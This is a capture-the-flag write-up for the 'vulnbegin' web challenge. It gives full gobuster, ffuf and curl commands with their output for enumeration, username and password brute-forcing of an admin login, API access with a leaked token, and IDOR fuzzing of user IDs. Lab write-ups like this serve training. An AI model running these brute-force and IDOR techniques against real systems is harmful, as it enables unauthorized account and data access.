Note: I have placed by ctfchallenge cookie string in an environment variable called `ctfc`

# Enumeration

## gobuster dir

### root directory

`gobuster dir -u http://www.vulnbegin.co.uk/ -w /usr/share/wordlists/ctf/content.txt -t 1 -c $ctfc --delay .1s`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.vulnbegin.co.uk/
[+] Method:                  GET
[+] Threads:                 1
[+] Wordlist:                /usr/share/wordlists/ctf/content.txt
[+] Negative Status codes:   404
[+] Cookies:                 $ctfc
[+] User Agent:              gobuster/3.3
[+] Timeout:                 1s
===============================================================
2022/12/11 10:53:51 Starting gobuster in directory enumeration mode
===============================================================
/cpadmin              (Status: 302) [Size: 0] [--> /cpadmin/login]
/css                  (Status: 301) [Size: 178] [--> http://www.vulnbegin.co.uk/css/]
/js                   (Status: 301) [Size: 178] [--> http://www.vulnbegin.co.uk/js/]
/robots.txt           (Status: 200) [Size: 41]
===============================================================
2022/12/11 11:06:21 Finished
===============================================================

```
We see `/robots.txt`, which disallows `/secret_d1rect0y/`. This contains one of the flags.

The `/cpadmin` has a login page 

### cpadmin

`gobuster dir -u http://www.vulnbegin.co.uk/cpadmin/ -w /usr/share/wordlists/ctf/content.txt -t 1 -c $ctfc --delay .1s`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.vulnbegin.co.uk/cpadmin
[+] Method:                  GET
[+] Threads:                 1
[+] Delay:                   100ms
[+] Wordlist:                /usr/share/wordlists/ctf/content.txt
[+] Negative Status codes:   404
[+] Cookies:                 $ctfc
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/11 14:19:20 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1372]
/logout               (Status: 302) [Size: 0] [--> /cpadmin?logout=true]
===============================================================
2022/12/11 14:31:23 Finished
===============================================================

```
### secret_d1rect0y

`gobuster dir -u http://www.vulnbegin.co.uk/secret_d1rect0y/ -w /usr/share/wordlists/ctf/content.txt -t 1 -c $ctfc --delay .1s`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.vulnbegin.co.uk/secret_d1rect0y
[+] Method:                  GET
[+] Threads:                 1
[+] Delay:                   100ms
[+] Wordlist:                /usr/share/wordlists/ctf/content.txt
[+] Negative Status codes:   404
[+] Cookies:                 $ctfc
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/11 14:33:19 Starting gobuster in directory enumeration mode
===============================================================
===============================================================
2022/12/11 14:46:02 Finished
===============================================================

```

## gobuster vhost
`gobuster vhost -u http://www.vulnbegin.co.uk/ -w /usr/share/wordlists/ctf/subdomains.txt --append-domain -t 1 --delay 0.1s -c $ctfc`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://www.vulnbegin.co.uk/
[+] Method:          GET
[+] Threads:         1
[+] Delay:           100ms
[+] Wordlist:        /usr/share/wordlists/ctf/subdomains.txt
[+] Cookies:         $ctfc
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2022/12/11 11:14:09 Starting gobuster in VHOST enumeration mode
===============================================================
===============================================================
2022/12/11 11:22:12 Finished
===============================================================

```

## dnslookup

`nslookup -type=any vulnbegin.co.uk 8.8.8.8`
```
Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
Name:	vulnbegin.co.uk
Address: 68.183.255.206
vulnbegin.co.uk	nameserver = ns1.digitalocean.com.
vulnbegin.co.uk	nameserver = ns2.digitalocean.com.
vulnbegin.co.uk	nameserver = ns3.digitalocean.com.
vulnbegin.co.uk
	origin = ns1.digitalocean.com
	mail addr = hostmaster.vulnbegin.co.uk
	serial = 1626211765
	refresh = 10800
	retry = 3600
	expire = 604800
	minimum = 1800
vulnbegin.co.uk	text = "[^FLAG^BED649C4DB2DF265BD29419C13D82117^FLAG^]"

Authoritative answers can be found from:

```
Here, we can see one of the flags. The command `dig vulnbegin.co.uk txt` will show the same thing.

## subfinder
`subfinder -d vulnbegin.co.uk`
```
[INF] Loading provider config from '/root/.config/subfinder/provider-config.yaml'
[INF] Enumerating subdomains for 'vulnbegin.co.uk'
v64hss83.vulnbegin.co.uk
www.vulnbegin.co.uk
server.vulnbegin.co.uk
vulnbegin.co.uk
[INF] Found 4 subdomains for 'vulnbegin.co.uk' in 1 second 462 milliseconds
```
`server.vulnbegin.co.uk` has a flag
`v64hss83.vulnbegin.co.uk` has another flag


It looks like the `v64hss83` subdomain can be found manually by looking at certs on [crt.sh](https://crt.sh/?q=vulnbegin.co.uk) 

# Exploitation

## Password bruteforce

`http://www.vulnbegin.co.uk/cpadmin/login` reveals when a username is incorrect with a `Username is invalid` prompt.

Thus, we can try to bruteforce the username and then the password.

`ffuf -w /usr/share/wordlists/ctf/usernames.txt -X POST -d "username=FUZZ&password=x" -t 1 -p 0.1 -b $ctfc -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -fr 'Username is invalid'`
```
________________________________________________

 :: Method           : POST
 :: URL              : http://www.vulnbegin.co.uk/cpadmin/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/ctf/usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: $ctfc
 :: Data             : username=FUZZ&password=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1
 :: Delay            : 0.10 seconds
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Regexp: Username is invalid
________________________________________________

admin                   [Status: 200, Size: 1483, Words: 422, Lines: 37]
```


Now, we can try to bruteforce the password with the same technique

`ffuf -w /usr/share/wordlists/ctf/passwords.txt -X POST -d "username=admin&password=FUZZ" -t 1 -p 0.1 -b $ctfc -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -fr 'Password is invalid'`
```
________________________________________________

 :: Method           : POST
 :: URL              : http://www.vulnbegin.co.uk/cpadmin/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/ctf/passwords.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: $ctfc
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1
 :: Delay            : 0.10 seconds
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Regexp: Password is invalid
________________________________________________

159753                  [Status: 302, Size: 0, Words: 1, Lines: 1]

```
Once logged in with the password `159753`, we find another flag.

When logged in as `admin`, there is a cookie titled `token` with a value of `2eff535bd75e77b62c70ba1e4dcb2873`. Since we're authenticted, we can try to bruteforce `/cpadmin` again.

`gobuster dir -u http://www.vulnbegin.co.uk/cpadmin/ -w /usr/share/wordlists/ctf/content.txt -t 1 -c "$ctfc;token=2eff535bd75e77b62c70ba1e4dcb2873" --delay .1s`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.vulnbegin.co.uk/cpadmin
[+] Method:                  GET
[+] Threads:                 1
[+] Delay:                   100ms
[+] Wordlist:                /usr/share/wordlists/ctf/content.txt
[+] Negative Status codes:   404
[+] Cookies:                 $ctfc;token=2eff535bd75e77b62c70ba1e4dcb2873
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/11 20:35:20 Starting gobuster in directory enumeration mode
===============================================================
/env				  (Status: 200) [Size: 111]
/login                (Status: 302) [Size: 0] [--> /cpadmin]
/logout               (Status: 302) [Size: 0] [--> /cpadmin?logout=true]
===============================================================
2022/12/11 20:50:23 Finished
===============================================================
```

`/env` shows us another flag along with an API key:

```
{"api_key":"X-Token: 492E64385D3779BC5F040E2B19D67742","flag":"[^FLAG^F6A691584431F9F2C29A3A2DE85A2210^FLAG^]"}
```

## API Hijacking

The previously discovered subdomain, `server.vulnbegin.co.uk`, there was a response informing us that `User Not Authenticated`.

I tried, authenticating with the `token` cookie, but that didn't do anything, so I then tried authenticating with the api key header:

`curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: $ctfc" http://server.vulnbegin.co.uk`
```
{"messaged":"User Authenticated","flag":"[^FLAG^0BDC60CC5E283476E7107C814C18DCCF^FLAG^]"}
```


### Authenticated API Fuzzing

`ffuf -u http://server.vulnbegin.co.uk/FUZZ -w /usr/share/wordlists/ctf/content.txt -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: $ctfc" -t 1 -p 0.1` 
```
________________________________________________
:: Method           : GET
:: URL              : http://server.vulnbegin.co.uk/FUZZ
:: Header           : X-Token: 492E64385D3779BC5F040E2B19D67742
:: Header           : Cookie: $ctfc
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 1
:: Delay            : 0.1 seconds
:: Matcher          : Response status: all
:: Filter           : Response status: 404
________________________________________________

robots.txt              [Status: 200, Size: 42, Words: 3, Lines: 2]
user                    [Status: 200, Size: 89, Words: 1, Lines: 1]
```

We can access the `user` endpoint by running the following:
`curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: $ctfc" http://server.vulnbegin.co.uk/user`
```
{"id":27,"endpoint":"\/user\/27"}
```

It appears that the API is returning an endpoint for us to access, so I continue with
`curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: $ctfc" http://server.vulnbegin.co.uk/user/27`
```
{"id":27,"username":"vulnbegin_website","endpoint":"\/user\/27\/info"}
```
And
`curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: $ctfc" http://server.vulnbegin.co.uk/user/27/info`
```
{"id":27,"username":"vulnbegin_website","description":"User for the main website","flag":"[^FLAG^7B3A24F3368E71842ED7053CF1E51BB0^FLAG^]"}
```
Here, we can see another flag
### API IDOR

Because it appears that users are referenced by IDs, we can fuzz for that:
`ffuf -u http://server.vulnbegin.co.uk/user/FUZZ/info -w /usr/share/wordlists/seclists/Fuzzing/3-digits-000-999.txt -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: $ctfc" -t 1 -p 0.1`
```
________________________________________________

 :: Method           : GET
 :: URL              : http://server.vulnbegin.co.uk/user/FUZZ/info
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/3-digits-000-999.txt
 :: Header           : X-Token: 492E64385D3779BC5F040E2B19D67742
 :: Header           : Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSXdibmR1TW1neGVpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI5Mzc0NzRmZjhlNTYwZTk0MjBhYWUyM2FiZTM0OWIzYiJ9
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1
 :: Delay            : 0.10 seconds
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

005                     [Status: 200, Size: 120, Words: 4, Lines: 1]
027                     [Status: 200, Size: 138, Words: 5, Lines: 1]
```

We can check for the info of user 5:
`curl -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: $ctfc" http://server.vulnbegin.co.uk/user/5/info`
```
{"id":5,"username":"admin","description":"admin for the server","flag":"[^FLAG^3D82BE780F46EE86CE060D23E6E80639^FLAG^]"}
``` 

We have the last flag!